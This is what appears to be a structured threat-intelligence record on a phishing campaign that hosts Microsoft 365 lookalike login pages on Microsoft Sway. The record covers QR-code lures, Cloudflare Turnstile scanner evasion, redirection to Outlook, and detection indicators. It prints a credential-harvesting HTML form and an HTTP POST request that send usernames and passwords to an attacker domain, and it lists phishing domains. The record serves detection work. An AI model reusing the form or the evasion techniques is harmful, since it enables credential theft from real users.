package_info.package_versions: N/A (abuse of cloud service, not a traditional package)
package_info.why_malicious: This campaign abuses Microsoft Sway to host phishing pages that convincingly mimic Microsoft 365 login screens. Attackers use QR codes in emails to lure victims, bypassing traditional email security scanners. The phishing pages employ adversary-in-the-middle techniques to steal credentials and two-factor authentication codes. The use of trusted Microsoft infrastructure increases user trust and evades detection, while additional anti-scanning measures such as Cloudflare Turnstile CAPTCHA are used to block automated analysis.

execution_context.trigger: User scans QR code in phishing email

malicious_snippets.code_behavior: When the user scans the QR code in the phishing email, the QR code resolves to a sway.cloud.microsoft URL, which initiates a browser session to the phishing page, enabling the attacker to bypass email security scanners and direct the victim to a credential harvesting site.

malice_analysis.why_suspicious: Embedding a QR code that resolves to a login page is a known evasion technique to bypass text-based email security scanners and lure users to phishing sites.
malice_analysis.violated_expectations: Legitimate business emails rarely use QR codes to direct users to login pages for sensitive services like Microsoft 365; such QR codes typically point to event check-ins or informational resources, not authentication portals.
malice_analysis.similar_legitimate_use: QR codes are sometimes used for document sharing or event check-ins, but not for credential entry on Microsoft 365.
key_indicators: QR code in email that resolves to sway.cloud.microsoft URL
QR code destination is a login page mimicking Microsoft 365
Absence of context or explanation for QR code in email

execution_context.trigger: User visits phishing page after scanning QR code or clicking link
execution_context.file_location: HTML/JS code on sway.cloud.microsoft phishing page

malicious_snippets.code_snippet:
<form id="loginForm" action="https://login.msofficeopt.nl/submit" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Sign in</button>
</form>
malicious_snippets.code_behavior: When the user submits their credentials on the phishing page, the form transmits the entered username and password via HTTP POST to an attacker-controlled domain, resulting in credential exfiltration.

malice_analysis.why_suspicious: The login form's action attribute points to a domain (login.msofficeopt.nl) that is not owned by Microsoft, indicating that credentials are being sent to an attacker.
malice_analysis.violated_expectations: Legitimate Microsoft 365 login forms always POST to official Microsoft domains such as microsoft.com or login.microsoftonline.com, never to unrelated third-party domains.
malice_analysis.similar_legitimate_use: There is no legitimate reason for a Microsoft 365 login form to POST to a non-Microsoft domain.
key_indicators: Form action attribute set to non-Microsoft domain
Phishing page visually mimics Microsoft 365 login
Collection of credentials via HTML form on Sway-hosted page

execution_context.file_location: HTML/JS code on sway.cloud.microsoft phishing page

malicious_snippets.code_behavior: Upon page load, the phishing page loads the Cloudflare Turnstile CAPTCHA script, requiring the user to complete a CAPTCHA challenge before accessing the credential harvesting form, thereby blocking automated scanners and allowing only human users to proceed.

malice_analysis.why_suspicious: The use of Cloudflare Turnstile CAPTCHA on a Microsoft 365 login lookalike page is highly unusual and is implemented to prevent automated security scanners from analyzing the phishing content.
malice_analysis.violated_expectations: Legitimate Microsoft 365 login pages do not use third-party CAPTCHAs such as Cloudflare Turnstile; CAPTCHAs are rare and, if present, are typically implemented by Microsoft directly.
malice_analysis.similar_legitimate_use: Some legitimate sites use CAPTCHAs to prevent abuse, but Microsoft 365 login does not use Cloudflare Turnstile.
key_indicators: Cloudflare Turnstile script loaded on Sway-hosted login page
CAPTCHA challenge gating access to phishing payload
CAPTCHA implementation not present on legitimate Microsoft login

execution_context.trigger: User submits credentials via phishing form
execution_context.file_location: Server-side script on attacker-controlled domain (e.g., login.msofficeopt.nl)

malicious_snippets.code_snippet:
POST /submit HTTP/1.1
Host: login.msofficeopt.nl
Content-Type: application/x-www-form-urlencoded

username=...&password=...
malicious_snippets.code_behavior: When the victim submits the phishing form, the browser sends an HTTP POST request containing the username and password to the attacker's server, enabling the attacker to capture the victim's credentials.

malice_analysis.why_suspicious: The POST request containing credentials is sent to a domain not associated with Microsoft, which is a clear indicator of credential exfiltration.
malice_analysis.violated_expectations: Legitimate Microsoft 365 authentication never transmits credentials to third-party domains; all authentication traffic should be directed to Microsoft-owned endpoints.
malice_analysis.similar_legitimate_use: No legitimate Microsoft login process sends credentials to non-Microsoft domains.
key_indicators: Exfiltration of credentials via form submission
Domain name mimics Microsoft but is not owned by Microsoft

malicious_snippets.code_behavior: After the victim submits their credentials, the phishing page immediately redirects the browser to the legitimate Microsoft Outlook site, creating the illusion of a successful login and reducing the likelihood of user suspicion.

malice_analysis.why_suspicious: Redirecting victims to a legitimate Microsoft service after credential theft is a common tactic to avoid raising suspicion and to mimic a seamless login experience.
malice_analysis.violated_expectations: Legitimate Microsoft login failures would display an error message or prompt for re-authentication, not redirect to a logged-in page without verification.
malice_analysis.similar_legitimate_use: Some SSO flows redirect after successful login, but not after failed authentication or on non-Microsoft domains.
key_indicators: Immediate redirection to legitimate Microsoft service after credential POST
No error message or feedback on failed login attempt
Redirection occurs from a non-Microsoft domain

attack_chain.action: Victim receives a phishing email containing a QR code or a link to a sway.cloud.microsoft page.
attack_chain.leads_to: Victim scans the QR code or clicks the link, opening the phishing page hosted on Microsoft Sway.

attack_chain.action: Victim is presented with a Microsoft 365 lookalike login page, potentially gated by a Cloudflare Turnstile CAPTCHA to block automated analysis.
attack_chain.leads_to: Victim completes CAPTCHA (if present) and enters credentials into the phishing form.

attack_chain.action: Victim's credentials are transmitted to an attacker-controlled server via HTTP POST.
attack_chain.leads_to: Attacker receives the stolen credentials; victim is prepared for redirection.

attack_chain.action: Victim is redirected to the legitimate Microsoft Outlook service to avoid raising suspicion.
attack_chain.leads_to: Attack is complete; victim may not realize their credentials have been compromised.

behavioral_signatures: Emails containing QR codes that resolve to sway.cloud.microsoft URLs leading to login pages
Microsoft 365 login forms hosted on Sway that POST credentials to non-Microsoft domains
Presence of Cloudflare Turnstile CAPTCHA on Microsoft 365 lookalike login pages hosted on Sway
Immediate redirection to legitimate Microsoft services after credential submission on non-Microsoft domains
file_indicators: HTML files on sway.cloud.microsoft containing login forms with action attributes pointing to non-Microsoft domains
QR code images embedded in phishing emails that resolve to Sway-hosted login pages
Inclusion of Cloudflare Turnstile scripts (challenges.cloudflare.com/turnstile/v0/api.js) on Sway-hosted pages
network_indicators: Outbound connections to sway.cloud.microsoft with suspicious or atypical URL paths
HTTP POST requests to domains such as login.msofficeopt.nl, gdu.msofficeopt.nl, ffnthost365.cfd, nedttis365.xyz, msntntion0.cfd
Loading of Cloudflare Turnstile API from Sway-hosted pages mimicking Microsoft login
detection_knowledge.how_to_detect: Monitor inbound emails for QR codes that resolve to sway.cloud.microsoft URLs, especially those leading to login forms. Flag Sway-hosted pages that contain login forms with action attributes pointing to non-Microsoft domains or that load Cloudflare Turnstile scripts. Detect HTTP POST requests from endpoints to known phishing domains. Alert when a user is immediately redirected to a legitimate Microsoft service after submitting credentials on a non-Microsoft domain. Correlate these behaviors to identify and block phishing campaigns abusing Microsoft Sway.
